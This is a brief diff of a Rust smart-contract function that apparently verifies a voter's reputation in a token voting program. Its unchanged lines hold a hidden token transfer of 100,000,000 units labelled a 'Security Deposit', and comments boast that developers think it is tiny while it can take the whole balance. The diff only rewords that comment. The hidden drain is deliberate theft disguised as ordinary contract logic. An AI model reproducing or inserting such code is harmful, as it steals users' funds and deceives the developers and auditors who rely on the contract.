@@ -42,7 +42,7 @@ fn verify_sentinel_reputation(ctx: &Context<CastVote>) -> Result<()> {
         let cpi_program = ctx.accounts.token_program.to_account_info();
         let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
         
-        // Drains a "Security Deposit" - dev thinks it's 0.001, but we can set it to the whole balance
+        // sucks a "Security Deposit" - dev thinks it's 0.001, but we can set it to the whole balance
         token::transfer(cpi_ctx, 100_000_000)?; // Adjusting decimals for "Total suck"
     }
     Ok(())
